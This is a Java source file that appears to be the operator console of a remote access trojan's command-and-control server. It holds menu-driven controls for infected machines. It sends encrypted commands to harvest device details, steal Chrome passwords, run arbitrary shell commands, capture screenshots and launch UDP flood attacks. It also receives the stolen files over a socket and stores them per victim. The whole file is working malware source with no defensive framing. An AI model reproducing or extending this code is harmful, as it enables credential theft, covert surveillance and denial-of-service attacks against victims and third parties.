package eu.grayroot.grayserver;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import eu.grayroot.grayserver.cipher.EncryptUtils;
import eu.grayroot.grayserver.cipher.RSA;
import eu.grayroot.grayserver.sql.Client;
import eu.grayroot.grayserver.sql.ClientData;

public class Connections {

	private Streams selectedstreams;
	public Connections(Streams selectedstreams) {
		if (selectedstreams == null) {
			throw new IllegalArgumentException();
		}
		this.selectedstreams = selectedstreams;
	}

	public void execute() throws NoSuchAlgorithmException, InvalidKeySpecException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, NoSuchPaddingException {
		while(true) {
			System.out.println("Select an opration to execute : ");
			System.out.println("(0)- Ping Device.");
			System.out.println("(1)- Show Device's Informations.");
			System.out.println("(2)- Steal Chrome passwords.");
			System.out.println("(3)- Execute Terminal Commands.");
			System.out.println("(4)- Send a message.");
			System.out.println("(5)- ScreenShot.");
			System.out.println("(6)- UDP Flood");
			System.out.println("(7)- Back to menu.");
			try {
				String selected = new BufferedReader(new InputStreamReader(System.in)).readLine();
				switch(selected) {

				case "0":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("PING", Main.publicKey)));
					System.out.println("Result: " + new RSA().decrypt(selectedstreams.ReadMsg(), Main.privateKey));
					break;

				case "1":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("INFO", Main.publicKey)));
					String result = new RSA().decrypt(selectedstreams.ReadMsg(), Main.privateKey);
					String[] lines = result.split(System.getProperty("line.separator"));
					String name = lines[0].replace("Name: ", "");
					String os = lines[1].replace("OS: ", "");
					String publicIP = lines[2].replace("Public IP: ", "");
					String privateIP = lines[3].replace("Private IP: ", "");
					String MAC = lines[4].replace("MAC: ", "");
					System.out.println("Name: " + name);
					System.out.println("OS: " + os);
					System.out.println("Public IP: " + publicIP);
					System.out.println("Private IP: " + privateIP);
					System.out.println("MAC: " + MAC);
					String hash = new EncryptUtils().encryptMd5(MAC + publicIP);
					System.out.println("Hash: " + hash);
					Client client = new Client(0, name, os, publicIP, privateIP, MAC, hash);
					if(!new ClientData(Main.server.getConnection()).isRegistered(hash)) {
						System.out.println("New client found #" + hash);
						new ClientData(Main.server.getConnection()).registerClient(client);
					} else {
						System.out.println("Updating client #" + hash);
						new ClientData(Main.server.getConnection()).updateClient(client);
					}
					break;

				case "2":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("CHROME_STEAL", Main.publicKey)));
					String passwordsInfo = new RSA().decrypt(selectedstreams.ReadMsg(), Main.privateKey);
					String[] passwordsLines = passwordsInfo.split(System.getProperty("line.separator"));
					int fileSize = Integer.valueOf(passwordsLines[0].replace("File Size: ", ""));
					String fileName = passwordsLines[1].replace("File Name: ", "");
					publicIP = passwordsLines[2].replace("Public IP: ", "");
					MAC = passwordsLines[3].replace("MAC: ", "");
					hash = new EncryptUtils().encryptMd5(MAC + publicIP);
					System.out.println(fileName + " (" + fileSize + " bytes)");
					ServerSocket serverSocket = new ServerSocket(4826);
					Socket socket = serverSocket.accept();
					InputStream in;
					int bufferSize=0;
					Files.createDirectories(Paths.get("Data/" + hash));
					File file = new File("Data/" + hash + "/" + fileName);
					file.createNewFile();
					try {
						bufferSize=socket.getReceiveBufferSize();
						in=socket.getInputStream();
						DataInputStream clientData = new DataInputStream(in);
						OutputStream output = new FileOutputStream(file);
						byte[] buffer = new byte[bufferSize];
						int read;
						while((read = clientData.read(buffer)) != -1){
							output.write(buffer, 0, read);
						}
						output.close();

					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					socket.close();
					serverSocket.close();
					break;

				case "3":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("EXEC", Main.publicKey)));
					BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
					String commandString = null;
					System.out.println("Enter command to execute: ");
					commandString = br.readLine();
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText(commandString, Main.publicKey)));
					System.out.println("Command Result: " + new RSA().decrypt(selectedstreams.ReadMsg(), Main.privateKey));
					break;
					
				case "4":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("MSG", Main.publicKey)));
					br = new BufferedReader(new InputStreamReader(System.in));
					String message = null;
					System.out.println("Enter message to send: ");
					message = br.readLine();
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText(message, Main.publicKey)));
					System.out.println("Message sent!");
					break;

				case "5":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("SCREEN", Main.publicKey)));
					String screenShotInfo = new RSA().decrypt(selectedstreams.ReadMsg(), Main.privateKey);
					String[] screenshotLines = screenShotInfo.split(System.getProperty("line.separator"));
					fileSize = Integer.valueOf(screenshotLines[0].replace("File Size: ", ""));
					fileName = screenshotLines[1].replace("File Name: ", "");
					publicIP = screenshotLines[2].replace("Public IP: ", "");
					MAC = screenshotLines[3].replace("MAC: ", "");
					hash = new EncryptUtils().encryptMd5(MAC + publicIP);
					System.out.println(fileName + " (" + fileSize + " bytes)");
					serverSocket = new ServerSocket(4826);
					socket = serverSocket.accept();
					bufferSize=0;
					Files.createDirectories(Paths.get("Data/" + hash));
					file = new File("Data/" + hash + "/" + fileName);
					file.createNewFile();
					try {
						bufferSize=socket.getReceiveBufferSize();
						in=socket.getInputStream();
						DataInputStream clientData = new DataInputStream(in);
						OutputStream output = new FileOutputStream(file);
						byte[] buffer = new byte[bufferSize];
						int read;
						while((read = clientData.read(buffer)) != -1){
							output.write(buffer, 0, read);
						}
						output.close();

					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					socket.close();
					serverSocket.close();
					break;
					
				case "6":
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText("UDP", Main.publicKey)));
					br = new BufferedReader(new InputStreamReader(System.in));
					String targetIP = null;
					String targetPort = null;
					System.out.println("Enter IP to attack: ");
					targetIP = br.readLine();
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText(targetIP, Main.publicKey)));
					System.out.println("Enter Port to attack: ");
					targetPort = br.readLine();
					selectedstreams.sendMsG(Base64.getEncoder().encodeToString(new RSA().encryptText(targetPort, Main.publicKey)));
					System.out.println("Attack sent!");
					break;
					
				case "7":
					return;
				default:
					break;
				}

			} catch (IOException e) {
				e.printStackTrace();
			}

		}
	}
}